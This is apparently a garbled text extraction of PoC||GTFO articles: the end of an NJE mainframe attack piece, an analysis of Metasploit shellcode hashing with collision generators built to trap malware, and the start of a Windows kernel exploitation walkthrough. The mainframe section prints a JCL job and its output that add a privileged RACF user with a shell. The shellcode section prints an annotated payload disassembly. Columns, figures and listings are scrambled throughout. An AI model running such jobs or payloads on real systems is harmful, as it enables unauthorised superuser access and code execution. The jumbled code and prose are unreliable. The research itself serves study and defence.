−−−−−−−−−10−−−−−−−−20−−−−−−−−30−−−−−−−−−40−−−−−−−−−50−−−−−−−−−60−−−−−−−−−70−−−−−−−−−80
11
//H4CKRNJE JOB ( 1 2 3 4 5 6 7 ) , ’ABC 1 2 3 ’ ,CLASS=A,
13 //
MSGLEVEL=(0 ,0) ,MSGCLASS=K,NOTIFY=&SYSUID
/∗XEQ
POTATO
15 //TSOCMD
EXEC PGM=IKJEFT01
//SYSTSPRT DD
SYSOUT=∗
17 //SYSOUT
DD
SYSOUT=∗
//SYSTSIN DD
∗
19
RALTER RACFVARS &RACLNDE ADDMEM(H4CKR)
SETROPTS RACLIST(RACFVARS) REFRESH
21
ADDUSER DADE PASSWORD(BESTPWD)
ALU DADE TSO(ACCTNUM(ACCT#) PROC(ISPFPROC) )
23
ALU DADE OMVS(UID( 3 1 3 3 7 ) PROGRAM(/ b i n / sh ) HOME( / ) )
/∗
25
−−−−−−−−−10−−−−−−−−20−−−−−−−−30−−−−−−−−−40−−−−−−−−−50−−−−−−−−−60−−−−−−−−−70−−−−−−−−−80
27 ===================
[ + ] Response R e c e i v e d
29 [ + ] NMR Records
===================
31 [ + ] User Message
[ + ] To User : MARGO
33 [ + ] Message : 1 5 . 2 9 . 5 5 JOB00048 $HASP122 H4CKRNJE ( JOB00049 FROM CACTUS ) RECEIVED AT POTATO
===================
35 [ + ] Records i n SYSOUT:
1
J E S 2 J O B L O G −− S Y S T E M E M C 1 −− N O D E P O T A T O
37 0
[...]
39 1READY
RALTER RACFVARS &RACLNDE ADDMEM(H4CKR)
41 ICH11009I RACLISTED PROFILES FOR RACFVARS WILL NOT REFLECT THE UPDATE( S ) UNTIL A SETROPTS
REFRESH IS ISSUED .
READY
43
SETROPTS RACLIST(RACFVARS) REFRESH
READY
45
ADDUSER DADE PASSWORD(BESTPWD)
READY
47
ALU DADE TSO(ACCTNUM(ACCT#) PROC(ISPFPROC) ) SPECIAL
READY
49
ALU DADE OMVS(UID( 3 1 3 3 7 ) PROGRAM(/ b i n / sh ) HOME( / ) )
READY
51 END
Figure 19 – Adding a superuser
516.6
Conclusion
NJE is relatively unknown despite being so widely
used and important to most mainframe implementa-
tions. Hopefully, this article showed you how power-
ful NJE is, and how dangerous it can be. Everything
in this article could be prevented with a few simple
tweaks. Not using the PASSWORD= parameter and
instead using SSL certificates for system authenti-
cation would make these attacks useless. On top of
that, instead of declaring the nodes to RACF, you
could give very specific access rights to users from
various nodes. This would prevent a malicious user
from submitting as any user they please.
If you’re really interested in this protocol,
NJELib also supports a debug mode, which gives
information about everything happening behind the
scenes. It’s very verbose. Another feature of
NJELib is the ability to deconstruct captured pack-
ets.
With the information in this article, you should
now have a grasp of the mainframe and NJE. Your
interest has been piqued about the endless poten-
tial of mainframe hacking. If that’s the case, where
do you go from here? There are some great write-
ups about buffer overflows and crypto on z/OS at
bigendiansmalls.com. You can also read up about
tn3270 hacking at mainframed767.tumblr.com.
525354!
30
60
!
50
15
!
q
КСВ =
Pr
Pf
Pr
Pf
1−
q
1+
Падения
эффициен
Ко тоячей т
С
В ол н ы
40
тные Потери
Обра
20
50
Самиздат
00
06
800
PoCkGTFO
2
1,5
1
!
!
30
40
1
12
1,6
13
1,3
1,5
1,4
18
50
0
2
600
800
1
!
55
1,5
14 15 16 17
5
3
6
1
2
∞ 20
10 8
29 0
8
1,0
28
1,
60
15
27
50
!
20567
Exploiting Weak Shellcode Hashes to Thwart Module Discovery;
or, Go Home, Malware, You’re Drunk!
by Mike Myers and Evan Sultanik
There is a famous Soviet film called Ирония
судьбы, или С лёгким паром! (The Irony of Fate,
or Enjoy Your Bath! ) that pokes fun at the unifor-
mity of Brezhnev-era public architecture and hous-
ing. The protagonist of the movie gets drunk and
winds up on a plane bound for Leningrad. When
he arrives, he mistakenly believes he landed in his
home town of Moscow. He stumbles into a taxi and
gives the address of his apartment. Sure enough, the
same address exists in Leningrad, and the building
looks identical to his apartment in Moscow. His key
even unlocks the apartment with the same number,
and the furniture inside is nearly identical to his,
so he decides to go to sleep. Everyone’s favorite
heart-warming romantic comedy ensues, but that’s
another story.
Neighbors, the goal of this article is to convince
you that Microsoft is Brezhnev, Windows is the So-
viet Union, kernel32.dll is the apartment, and
malware is the drunk protagonist. Furthermore,
dear neighbor, we will provide you with the knowl-
edge of how to coax malware into tippling from our
proverbial single malt waterfall so that it mistakenly
visits a different apartment in a faraway city.
7.1
performed with the GetProcAddress system API).
Much of maliciously delivered code—such as
nearly all remote exploits and most instances of code
that is injected by one process into another—shares
a common trait of being loaded illegitimately: it
circumvents the legitimate sequence of being loaded
and initialized by the OS executable loader. It is
therefore common for malicious code to not run as
benign code does in its own process. Because at-
tackers want to run their code within the access and
privilege of a target process, malicious code is in-
jected into it either by a local malicious process or by
an arbitrary code execution exploit. These two ap-
proaches (code injection and exploit shellcode) can
be treated similarly in that both of them involve
position-independent injected code.
Unlike benign code that is loaded by the operat-
ing system as a legitimate executable module from
a file on disk, illicit position-independent code must
search and locate essential addresses in memory on
its own without the assistance of the loader. Because
of Address Space Layout Randomization (ASLR),
the injected code cannot simply use pre-determined
hardcoded addresses of these locations, and neither
can it rely on the GetProcAddress routine, because
it doesn’t know its address either.
Typically, the first goal of the injected code is
to find kernel32.dll, because it contains the APIs
necessary to bootstrap the remainder of the mal-
ware’s computation. Before Windows 7, everyone
was using shellcode that assumed kernel32.dll
was the first module in the linked list pointed to
by the Process Environment Block (PEB), because
it was the first DLL module loaded by the process.
Windows 7 came along and started loading another
module first, and that broke everyone’s shellcode.
A common solution these days is just as frag-
ile. Some have proposed shellcode that assumes
kernel32.dll is the first DLL with a 12-character
name in the list (the shellcode just looks for a mod-
ule name length match). If we were to load in a
DLL named PoCrGTFO.dll before kernel32.dll,
that shellcode would fail. Other Windows 7 shell-
code assumes that kernel32.dll is the second (now
third) DLL in the linked list; we would be invalidat-
ing that assumption, too.
Background: PIC and Malware
Let’s begin with a look at how position-independent
code (PIC) used by malware is different from be-
nign code, and then examine the logic of the Meta-
Sploit payload known as “windows/exec,” which is
a representative example of both exploit shellcode
and malware-injected position-independent code. If
you’re already familiar with how malware-injected
position-independent code works, it’s safe for you to
skip to Section 7.2.
Most executable code on Windows is dynami-
cally linked, meaning it is compiled into separate
modules and then is linked together at runtime by
the operating system’s executable loader as a sys-
tem of imports and exports. This dynamic linkage
is either implicit (the typical kind; dynamic library
dependence is declared in the header and the loader
performs the address lookups at load time) or ex-
plicit (less common; the dynamic library is option-
ally loaded when needed and address lookups are
57The MetaSploit Framework is perhaps the most
popular exploit development and delivery frame-
work. One can create a custom exploit reusing stan-
dard components that MetaSploit provides, greatly
accelerating development time. One important com-
ponent is the payload. A “payload” in MetaSploit
parlance is the generic (reusable by many exploits)
portion of position-independent exploit code that at-
tackers execute after they have successfully begun
executing arbitrary instructions, but before they
have managed to do anything of value. A payload’s
function can be to either establish a barebones com-
mand & control capability (e.g., a remote shell), to
download and execute a second stage payload (most
common in real-world malware), or to simply exe-
cute another program on the victim. The latter is
the purest example of a payload, and this is what
we will show here. The logic of the “windows/exec”
InMemOrder Module List
modified
#(“????”) == #(“kernel32.dll”)
“PoCrGTFO.dll”
.
.
“kernel32.dll”
“kernel32.dll”
Ldr
?
strlen(module_name) == strlen("kernel32.dll")
?
hash(module_name) == hash("kernel32.dll")
Algorithm 1 The logic of a MetaSploit “exec” payload.
1: Get pointer to process’ header area in memory /* Initialize Shellcode */
2: m ←Derive a pointer to the list of loaded executable modules
3: for each module in m
4:
n m ← Derive a pointer to the module’s “base name”
5:
h m ← Hash(n m ); /* rotate every byte into a sum */
6:
t ←Derive a pointer to the module’s “export address table” (exported functions)
7:
for each function in t
8:
n f ← Derive a pointer to the function’s name
9:
h f ← Hash(n f ); /* rotate every byte into a sum */
10:
if h m and h f combine to match a precomputed value then
11:
We’ve found the system API (in this case, kernel32.dll’s WinExec function)
12:
end if
13:
end for
14: end for
15: Prepare the arguments to the found API, WinExec, then call it
58
PEB
payload is presented in Algorithm 1. As you can see,
it employs a relatively sophisticated method for dis-
covering kernel32.dll, by walking the PEB data
structure and matching the module by a hash of its
name.
On the following two pages, we have included an
annotated listing of the disassembly for this payload.
We encourage the reader to follow our comments in
order to get an understanding for how injected code
gets its bearings. Although this code directly locates
the function it wants, if it were going to find more
than one, it would probably just use this method
to find GetProcAddress instead and use that from
there on out.
For clarity, the disassembly is shown with rela-
tive addresses (offsets) only. The address operands
in relative jump instructions have been similarly for-
matted for clarity.Line 3
Addr.
+0x00 Opcodes
fc
Instruction
cld
+0x01
+0x06 e889000000
60 +0x07
+0x09
+0x0B 89e5
31d2
648b5230 +0x0F 8b520c mov edx, dword ptr [edx+0Ch]
+0x12 8b5214 mov edx, dword ptr [edx+14h]
+0x15 8b7228 mov esi, dword ptr [edx+28h]
+0x18 0fb74a26 movzx ecx, word ptr [edx+26h]
+0x1C
+0x1E
+0x20 31ff
31c0
ac xor edi, edi
xor eax, eax
lods byte ptr [esi]
+0x21 3c61 cmp al, 61h
+0x23 7c02 jl +0x27
+0x25 2c20 sub al, 20h
+0x27 c1cf0d ror edi, 0Dh
+0x2A 01c7 add edi, eax
+0x2C
+0x2E
+0x2F
+0x30 e2f0
52
57
8b5210 loop +0x1E
push edx
push edi
mov edx,dword ptr [edx+10h]
+0x33 8b423c mov eax,dword ptr [edx+3Ch]
+0x36 01d0 +0x38 8b4078 +0x3B 85c0 test eax, eax
+0x3D 744a je +0x89
+0x3F 01d0 add eax, edx
+0x41
+0x42 50
8b4818 push eax
mov ecx, dword ptr [eax+18h]
+0x45 8b5820 mov ebx,dword ptr [eax+20h]
+0x48 01d3 add ebx, edx
+0x4A e33c jecxz +0x88
+0x4C 49 +0x4D 8b348b
call +8F
pushad
mov ebp,esp
xor edx,edx
mov edx,dword ptr fs:[edx+30h]
Line 5
add eax, edx
mov eax, dword ptr [eax+78h]
dec ecx
mov esi, dword ptr [ebx+ecx*4]
59
Comment
Clears the “direction” flag (controls looping instructions to
follow).
Calls its initialization subroutine.
Initialization subroutine returns to here. Preserve all reg-
isters.
Establish a new stack frame.
EDX starts as 0.
Acquires the address of the Process Environment
Block (PEB), always at an offset of 0x30 from the value
in FS.
Gets the address within the PEB of the PEB_LDR_DATA
structure (which holds lists of loaded modules).
Get the “Flink” linked list pointer (within the
PEB_LDR_DATA) to the LIST_ENTRY within the first
LDR_MODULE in the InMemOrderModuleList.
Offset 0x28 within LDR_MODULE points to the base name of
the module, as a UTF-16 string.
Offset 0x26 within LDR_MODULE is the base name’s string
length in bytes; used as a loop counter.
The module name string “hashing” loop begins here.
Clear EAX to 0.
Recall that ESI points to the Unicode base name of a mod-
ule. This loads a byte of that string into AL.
0x0061 is “a” in UTF-16, also 0x61 is lowercase “a” in ASCII.
This is a check for capitalization.
Capital letters have values below 0x61; if this letter is below
0x61 then skip ahead.
Otherwise, capitalize the letter by subtracting 0x20. This
is to normalize string capitalization before hashing.
Step 1 of 2 of hashing algorithm: rotate EDI to the right
by 0x0D (13) bits.
Step 2 of 2 of hashing algorithm: add to a rolling sum in
EDI.
Repeat the loop (as ECX counts down).
The enumeration of exported function names begins here.
LDR_MODULE + offset 0x10 is the image base address of the
module.
LDR_MODULE + offset 0x3C = RVA of the start of the mod-
ule’s PE header.
Image base + RVA of PE header = pointer to the PE
header.
Offset 0x78 into a PE header is the RVA of the export
address table (EAT).
Test if there is no export table, in which case the value in
EAX is 0.
If it was 0, then abort the enumeration of exports and con-
tinue to the next module in memory.
Else, RVA of EAT (in EAX) + image base (EDX) → this
module’s export table (EAX).
Save the pointer to the EAT.
EAT offset 0x18 holds the number of functions exported by
name in this module.
EAT offset 0x20 holds the RVA to exported function names
table (ENT), an array of pointers.
ENT RVA (in EBX) + image base (in EDX) = pointer to
ENT (now in EBX).
Loop start: if every name in the array has been hashed
and none matched (ECX counter reached 0), then jump to
+0x88.
Otherwise, count down how many function names are left
to check.
Working the list backwards, calculate a RVA to the next
exported name → ESI.Line 9
+0x50 01d6 add esi, edx
+0x52 31ff xor edi, edi
+0x54
+0x56
+0x57
+0x5A
+0x5C 31c0
ac
c1cf0d
01c7
38e0 xor eax, eax
lods byte ptr [esi]
ror edi, 0Dh
add edi, eax
cmp al, ah
+0x5E
+0x60 75f4
037df8 jne +0x54
add edi, dword ptr [ebp-8]
+0x63 3b7d24 cmp edi, dword ptr [ebp+24h]
+0x66 75e2 +0x68 58 +0x69 8b5824 +0x6C 01d3 +0x6E 668b0c4b mov cx, word ptr [ebx+ecx*2]
+0x72 8b581c mov ebx, dword ptr [eax+1Ch]
+0x75 01d3 +0x77 8b048b +0x7A 01d0 +0x7C
+0x80
+0x81
+0x82
+0x83
+0x84
+0x85 89442424
5b
5b
61
59
5a
51 +0x86 ffe0 jmp eax
+0x88
+0x89
+0x8A 58
5f
5a pop eax
pop edi
pop edx
+0x8B 8b12 mov edx, dword ptr [edx]
+0x8D
+0x8F
+0x90 eb86
5d
6a01 jmp +0x15
pop ebp
push 1
+0x92
+0x98
+0x99 8d85b9000000
50
68318b6f87 +0x9E ffd5
jne +0x4A
pop eax
mov ebx, dword ptr [eax+24h]
add ebx, edx
add ebx, edx
mov eax, dword ptr [ebx+ecx*4]
add eax, edx
mov dword ptr[esp+24h], eax
pop ebx
pop ebx
popad
pop ecx
pop edx
push ecx
Line 15
lea eax, [ebp+0B9h]
push eax
push 876F8B31h
call ebp
60
Add RVA to image base (EDX) to calculate the pointer to
the next exported name => ESI.
Exported function name hashing loop begins here. EDI =
0.
EAX = 0.
This loads a byte of the ASCII name string into AL.
Step 1 of 2 in hashing algorithm.
Step 2 of 2 in hashing algorithm.
AH holds 0, so this is a tricky way of checking that AL is
0, which would indicate the end of a string.
If the string is not over yet, jump back and keep hashing.
Combine the hash of the exported function name with the
previously computed hash of the module name string that
is stored on the stack.
Final check of hashed name strings: does the resulting value
equal the precomputed value (that is also stored on the
stack)
If not, move to the next exported function name in the
table and repeat the hash & check.
Else, this is the shellcode’s desired function name. Prepare
to call this function by bringing back the location of the
EAT.
Offset 0x24 into the EAT is the RVA called AddressOf-
NameOrdinals.
RVA (in EBX) + image base (in EDX) => address of ex-
ported name ordinals array (in EBX).
Offset within the array of the exported function ordinals
=> ECX.
Offset 0x1C into the EAT is the RVA called AddressOf-
Functions.
RVA (in EBX) + image base (in EDX) => address of ex-
ported functions’ RVA array.
Offset within the array of the exported functions’ RVAs =>
ECX.
RVA of exported function (in EAX) + image base (in EDX)
=> pointer to function (in EAX)
Store the function pointer in a local variable on the stack.
Cleaning up the stack.
Cleaning up the stack.
More stack cleanup.
More stack cleanup.
More stack cleanup.
WinExec takes two arguments pushed onto the stack before
a call: a string indicating the executable, and a DWORD
indicating a show/hide flag.
This is the “call”
to the exported function,
kernel32!WinExec, and the end of the shellcode.
Execution jumps here if “this wasn’t the right module.”
Alternately it also may jump here for the same reason.
This and the last instruction: restore old values of EDI,
EDX.
The value at EDX is the first field of a linked list node, and
is a pointer to the next loaded module.
Start over with determining if this is the correct module.
Shellcode initialization begins here.
The “show/hide” flag value for the eventual call to
WinExec. 1 means “normal”.
Calculate an address to the command line string.
Push the command line parameter on the stack.
Store the pre-computed hash value sum of “kernel32.dll” +
“WinExec”.
Calls/returns to +0x06.7.2
Shellcode Havoc:
Generating Hash Collisions
and hash XOR 0x60. In the case when the value of
hash is greater than 256, we can inductively apply
this technique to generate the other characters.
The collision is constructed by building a string
from right to left. A Python script that enumerates
all possible collisions is as follows.
In the previous section, we described how PIC that
is injected at runtime is inherently “drunk”: since
it circumvents the normal loader, it needs to boot-
strap itself by finding the locations of its required
API calls. If the code is malicious, this imposes
additional constraints, such as size restrictions (on
the shellcode) and the inability to hardcode func-
tion names (to avoid fingerprinting). Some malware
is very naı̈ve and simply matches function names
based on length or their position in the EAT; such
approaches are easily thwarted, as described above.
Others have proposed completely relocating the Ad-
dress of Functions table and catching page faults
when any code tries to access it (cf. Phrack Vol-
ume 0x0b, Issue 0x3f, Phile #0x0f).
Most modern (Windows 7 and newer) malware
payloads temper their drunkenness by hashing the
module and function names of the APIs they need to
find. Unfortunately, the aforementioned constraints
on shellcode mean that a cryptographically secure
hashing algorithm would be too cumbersome to em-
ploy. Therefore, the hashing algorithms they use are
vulnerable to collisions. If we can generate a new
module and/or function name that hashes to
the same value that the malware is looking
for, and if we ensure that the decoy mod-
ule/function occurs before the real one in the
EAT linked list, then any time that function
is called we will know it is from malicious
code.
7.2.1
1 C = " a. . . z0. . . 9_"
S = set (C)
3 def c o l l i d e ( h ) :
h >>= 1 ;
5
i f h < 256:
f o r c in ( 0 x40 , 0 x80 , 0 x60 , h ) :
7
s = chr ( h ^ c )
i f s in S :
9
yield s
else :
11
f o r c in map( ord , C) :
i f not ( ( ( ( h − ( c | 0 x60 ) ) & 0 x1 )
!= 0 ) or ( ( h − ( c | 0 x60 ) ) < 1 9 2 ) ) :
13
f o r s in c o l l i d e ( h − ( c | 0 x60 ) ) :
y i e l d s + chr ( c )
Running collide(“LoadLibraryA”) yields over
100000 collisions in the first 5 seconds alone, and
can likely produce orders of magnitude more. Here
are the first ten:
4baaaabaabaa
2faaaabaabaa
0jaaaabaabaa
3ccaaabaabaa
1gcaaabaabaa
3daaaabaabaa
1haaaabaabaa
4acaaabaabaa
2ecaaabaabaa
0icaaabaabaa
Of course, only one collision is sufficient.
7.2.2
MetaSploit Payload Hash
Next, let’s examine the MetaSploit payload’s hash-
ing function described in the previous section. This
function is a bit more complex, because it involves
bit-wise rotations, making a brute-force approach
(like we used for The Shellcoder’s Handbook algo-
rithm) infeasible. The way the MetaSploit hash
works is: at each byte of a NULL-terminated string
(including the terminating NULL byte), it circularly
shifts the hash right by 0xD (13) places and then
adds the new byte. This hash was likely chosen be-
cause it is very succinct: the inner part of the loop
requires only two instructions (ror and add).
The key observation here is that, since the hash
is additive, any prefix of a string that hashes to zero
will not affect the overall hash of the entire string.
That means that if we can find a string that hashes
to zero, we can prepend it to any other string and
the result will have the same hash:
Shellcoder’s Handbook Hash
First, let’s take a look at the hashing algorithm es-
poused by Didier Stevens in The Shellcoder’s Hand-
book. In C, it’s a nifty little one-liner:
for(hash=0; *str; hash = (hash + (*str++ | 0x60)) << 1);
Using this algorithm, the string “LoadLibraryA”
hashes to 0xD5786.
The first thing to notice is that the least signifi-
cant bit of every hash will always be a zero, so let’s
just shift the hash right by one bit to get rid of the
zero. Next, notice that if the value of the hash is
less than 256, then any single character that bit-
wise matches the hash except for its sixth and sev-
enth most significant bits (0x60 = 0b01100000) will
be a collision. Therefore, we can try all four pos-
sibilities: hash, hash XOR 0x20, hash XOR 0x40,
Hash(A) = 0 =⇒ Hash(B) = Hash(A + B).
61This hash is relatively easy to encode as a Satis-
fiability Modulo Theories (SMT) problem, for which
we can then enlist a solver like Microsoft’s Z3 to enu-
merate all strings of a given length that hash to zero.
To find strings of length n that hash to zero, we cre-
ate n character variables, c 1 , . . . , c n , and n + 1 hash
variables, h 0 , h 1 , . . . , h n , where h i is the value of the
hash for the substring of length i, and h 0 is of course
zero. We constrain the character variables such that
they are printable ASCII characters (although this
is not technically necessary, since Windows allows
other characters in the EAT), and we also constrain
the hash variables according to the hashing method:
As you can see, this is very similar to Meta-
Sploit’s method, in that it rotates the hash by seven
bits for every character. However, unlike Meta-
Sploit’s additive method, SpyEye XORs the value
of each character. That makes things a bit more
complex, and it means that our trick of finding a
string prefix that hashes to zero will no longer work.
Nonetheless, this hash is not cryptographically se-
cure, and is vulnerable to collision.
Once again, let’s encode it as a SMT problem
with character variables c 1 , . . . , c n and hash vari-
ables h 0 , . . . , h n . The hash constraint this time is:
h i = ((h i−1 << 0x07)|(h i−1 >> 0x19)) ˆ c i ,
h i = ((h i−1 >> 0x0D)|(h i−1 << (32 − 0x0D))) + c i .
and we ask the SMT solver to enumerate solutions
in which h n equals the same hash value of the string
we want to collide with.
Once again, Microsoft’s Z3 solver makes short
work of finding collisions. A Python implementa-
tion of this collision is also provided in the feelies.
Here is a sample of ten strings that all collide with
“LoadLibraryA”:
We then ask the SMT solver to enumerate all solu-
tions in which h n = 0. We created a Python imple-
mentation of this using Microsoft’s Z3 solver, which
is included in the feelies. It is capable of producing
thousands of zero-hash strings within seconds. Here
are ten of them:
LNZLTXWQYV
TPTPPTVTWX
TPNPLTVWWZ
TPNPZTVWWS
TPVPXTVSWT
TPLPPTVXWX
TPNPNTVWWY
TPNPPTVWWX
TPVPZTVSWS
TPVPVTVSWU
RHDBJMZHQOIP
YMACZUQPXKKK
KMICZUQPXBKO
KMICZUBPXBJW
KMYCZVCPXBRW
So, for example, if we were to create
a DLL with an exported function named
“LNZLTXWQYVLoadLibraryA” that precedes the real
LoadLibraryA, a MetaSploit payload would mistak-
enly call our honeypot function.
7.2.3
7.3
ILPSKUXYYKKK
KMACZUQPXBKK
KMICZURPXBKW
KMICZVBPXBRW
KMYCZVAPXBRG
Acknowledgments
This work was partially funded by the Halting
Attacks Via Obstructing Configurations (HAVOC)
project under Mudge’s DARPA Cyber Fast Track
program, Digital Operatives IR&D, and our famous
Single Malt Waterfall. With that said, the opinions
and suspect Soviet cinematic similitudes expressed
in this article are the authors’ own and do not nec-
essarily reflect the views of DARPA or the United
States government.
SpyEye’s Hash
Finally, let’s take a look at an example from the
wild: the hash used by the SpyEye malware, pre-
sented in Algorithm 2. “LoadLibraryA” hashes to
0xC8AC8026.
Algorithm 2 The find-API-by-hashing method
used by SpyEye.
1: procedure Hash(name)
2:
j ← 0
3:
for i ← 0 to Len(name) do
4:
lef t ← (j << 0x07) & 0xFFFFFFFF
5:
right ← (j >> 0x19)
6:
j ← lef t | right
7:
j ← j ˆ name[i]
8:
end for
9:
return j
10: end procedure
628
UMPOwn
by Alex Ionescu
With the introduction of new mitigation tech-
nologies such as DeviceGuard, Windows 10 makes
it increasingly harder for attackers to enter the ker-
nel through Ring 0 drivers (which are now subject to
even stricter code integrity / signing verification) or
exploits (as increased mitigations and PatchGuard
validations are used to detect these). However, even
the best-written operating system with the best-
intentioned team of developers will encounter vul-
nerabilities that mitigations may be unable to stop.
Therefore, the last key element needed in de-
fending the security boundaries of the operating
system is a sane response to quickly patch such
vulnerabilities—without one, the entire defensive
strategy falls apart. Incorrectly dismissing vulnera-
bilities as “too hard to exploit” or misunderstanding
the security boundaries of the operating system can
lead to unfixed vulnerabilities, which can then be
used to work around the large amount of resources
that were developed in creating new security de-
fences.
In this article, we’ll take a look at an extremely
challenging exploit—given a kernel function to sig-
nal an event (KeSetEvent), can reliable code exe-
cution from user-mode be achieved, if all that the
attacker controls is the pointer to the event, which
can be set to any arbitrary value? We’ll need to take
a deep look at the Windows scheduler, understand
the semantics and code flows of event signaling, and
ultimately reveal a low-level scheduler attack that
can result in arbitrary ROP-based exploitation of
the kernel.
8.1
8.1.1
is how the kernel internally represents these objects.
As such, when an event is signaled, either KiSig-
nalNotificationObject or KiSignalSynchroniz-
ationObject is used, which will wake up one wait-
ing thread, or all waiting threads respectively.
How does the kernel associate waiting threads
with their underlying synchronization objects? The
answer lies in the KWAIT_BLOCK data structure.
Within which we find: the type of wait that the
thread is performing and a pointer to the thread it-
self (known as a KTHREAD structure). The two types
of wait that a thread can make are known as wait
any and wait all, and they determine if a single sig-
naled object is sufficient to wake up a thread (OR),
or if all of the objects that the thread is waiting on
must be signaled (AND). In Windows 8 and later, a
thread can also asynchronously wait on an object—
and associate an I/O Completion Port, or a KQUEUE
as it’s known in the kernel, with a wait block. For
this scenario, a new wait type was implemented:
wait notify.
Header
Wait
Block
Event
Object
Object
Thread 1
Stack
Wait
Block
ACT I. Controlling RIP and RSP
Object
Object
Wait Object Signaling
Thread 2
To understand event signaling in the NT kernel, one
must first understand that two types of events, and
their corresponding wake logic mechanisms:
Stack
Therefore, simply put, a notification event will
cause the iteration of all wait blocks—and the wak-
ing of each thread, or I/O completion port, based
on the wait type—whereas a synchronization event
will do the same, but only for a single thread. How
are these wait blocks linked you ask? On Windows 8
and later they are guaranteed to all be allocated in a
single, flat array, with a field in the KTHREAD, called
WaitBlockCount, storing the number of elements.
In Windows 7 and earlier, each wait block has a
1. Synchronization Events, which have a wake
one semantic
2. Notification Events, which have a wake any /
wake all semantic
The difference between these two types of events
is encoded in the Type field of the DISPATCHER_-
HEADER of the event’s KEVENT data structure, which
63KeSetEvent
pointer to the next (NextWaitBlock), and the final
wait block points back to the first, creating a circu-
lar singly-linked list. Finally, the KTHREAD structure
also has a WaitBlockList pointer, which serves as
the head of the list or array.
Waiting DeferredReady
Running Standby
KiDeferredReadyThread
KiUpdateThreadState
8.1.2
One of the most unique things about the NT
scheduler is that it does not rely on a scheduler tick
or other external event in order to kick off schedul-
ing operations and pre-emption. In fact, any time
a function has the possibility to change the state
of a thread, it must immediately react to possi-
ble system-wide scheduler changes that this state
transition has caused. Such functions implement
this logic by calling the KiExitDispatcher function,
with some hints as to what operation just occurred.
In the case of KeSetEvent, the AdjustUnwait hint
is used to indicate that one or more threads have
potentially been woken.
Internals Intermezzo
Let’s step back for a moment. We, from user mode,
control the pointer to an arbitrary KEVENT, which we
can construct in any way we want, and our goal is to
obtain code execution in kernel mode. Based on the
description we’ve seen so far, what are some ideas
that come to mind? Certainly, we could probably
cause some memory corruption or denial of service
activity, by creating incorrect wait blocks or an infi-
nite list. We could cause out-of-bounds memory ac-
cess and maybe even flip certain bits in kernel-mode
memory. But if the ultimate possibility (given the
right set of constraints and linked data structures) is
that a call to KeSetEvent will cause a thread to be
woken, are we able to control this thread, and more
importantly, can we get it to execute arbitrary code,
in kernel mode? Let’s keep digging into the internals
to find out more.
8.1.3
8.1.4
One Does Not Simply Exit the Dis-
patcher . . .
Once inside KiExitDispatcher, the scheduler first
checks if DeferredReady threads already exist in the
KPRCB’s queue. In our scenario, we know this will
be the case, so let’s see what happens next. A call to
KiProcessThreadWaitList is made, which iterates
over each thread in the DeferredReadyListHead,
and for each one, a subsequent call to KiUnlink-
WaitBlock occurs, which unlinks all wait blocks as-
sociated with this thread that are in WaitBlock-
Active state. Then, the AdjustReason field in the
KTHREAD structure is set to the hint value we refer-
enced earlier (AdjustUnwait here), and a potential
priority boost, or increment, is added in the Adjust-
Increment field of the KTHREAD. For events, this will
be equal to EVENT_INCREMENT, or 1.
Thread Waking
Suppose there exists a synchronization event, with
a single waiter (thus, a single wait block). This
waiter is currently blocked in a wait any fashion on
the event and has no other objects that it is wait-
ing on (the astute reader will note this is irrelevant,
due to the nature of wait any). The call to KeSet-
Event will follow the following pattern: KeSetEvent
→ KiSignalSynchronizationObject → KiTryUn-
waitThread → KiSignalThread
At the end of this chain, the thread’s state will
have changed, going from what should be its cur-
rent Waiting state to its new DeferredReady state,
indicating that it is, in a way, ready to be prepped
for execution. For it to be found in this state, it will
be added to the queue of DeferredReady threads for
the current processor, which lives in the KPRCB’s
DeferredReadyListHead lock-free stack list. Mean-
while, the wait block’s state, which should have been
set to WaitBlockActive, will now migrate to Wait-
BlockInactive, indicating that this is no longer a
valid wait—the thread is ready to be awakened.
8.1.5
Standby! Get Ready for My Thread
As each thread is processed in this way, a call to
KiReadyThread is finally performed. This routine’s
job is to check whether or not the thread’s kernel
stack is currently resident, as the NT kernel has
an optimization that automatically causes the evic-
tion (and even potential paging out) of the kernel
stack of any user-mode waiting thread after a cer-
tain period of time (typically 4-6 seconds). This is
exposed through the KernelStackResident field in
the KTHREAD. In Windows 10, a process’ set of kernel
stacks can also be evicted when a process is frozen
64as part of new behaviour for Modern (Metro) ap-
plications, so another flag, ProcessStackCountDec-
remented is also checked. For our purposes, let’s as-
sume the thread has a fully-resident kernel stack. In
this case, we move onto KiDeferredReadyThread,
which will handle the Def erredReady → Ready (or
Standby) transition.
Unlike a DeferredReady thread, which can be
ready on an arbitrary processor queue, a Ready
thread must be on the proper processor queue
(and/or shared queue, in Windows 8 and later). Ex-
plaining the selection algorithms is beyond the scope
of this article, but suffice it to say that the kernel will
attempt to find the best possible processor among:
idle cores, parked cores, heterogeneous vs. homoge-
neous cores, and busy cores, and balance that with
the hard affinity, soft affinity/ideal processor, and
group scheduling ranks and weights. Once a proces-
sor is chosen, the NextProcessor field in KTHREAD
is set to its index. Ultimately, the following possi-
bilities exist:
current processor, we can pre-empt ourselves and
force an immediate switch to the new thread, with-
out disturbing other processors and worrying about
pre-empting other threads.
In order to go down this path, the KTHREAD we
create must have a single, fixed, hard affinity, which
will be set to our currently executing processor. We
can do this by manipulating the Affinity field of
the KTHREAD. This will ensure that the scheduler
does not look at any idle processors. It must also
have the current processor as its soft affinity, or ideal
processor, so that the scheduler does not look at any
other busy processors. By restricting all idle proces-
sors from selection and ignoring all other busy pro-
cessors, the scheduler will have no choice but to pick
the current processor.
Yet we still have to choose between path #3 and
#4 above, and get this new thread to appear “more
important”. This is easily done by ensuring that our
new thread’s priority (in the KTHREAD’s Priority)
field will be higher than the current thread’s.
1. An idle processor was chosen. The KiUpdate-
ThreadState routine executes and sets the
thread’s state to Standby and sets the Next-
Thread field in the KPRCB to the selected
KTHREAD. The thread will start executing im-
minently.
8.1.7
Once KiDeferredReadyThread is done with its busi-
ness and returns to KiReadyThread, which returns
to KiProcessThreadWaitList, which returns to Ki-
ExitDispatcher, it’s time to act. The routine will
now verify if it’s possible to do so based on the IRQL
at the time the event was signalled—a level of DIS-
PATCH_LEVEL or above will indicate that nothing can
be done yet, so an interrupt will be queued, which
should fire as soon as the IRQL drops. Otherwise, it
will check if the NextThread field in the KPRCB is
populated, implying that a new thread was chosen
on the current processor.
At this point, NextThread will be set to NULL
(after capturing its value), and KiUpdateThread-
State will be called again, this time with the
new state set to Running, causing the KPRCB’s
CurrentThread field to now point to this thread
instead. The old thread, meanwhile, will be pre-
empted and added to the Ready list with KiQueue-
ReadyThread.
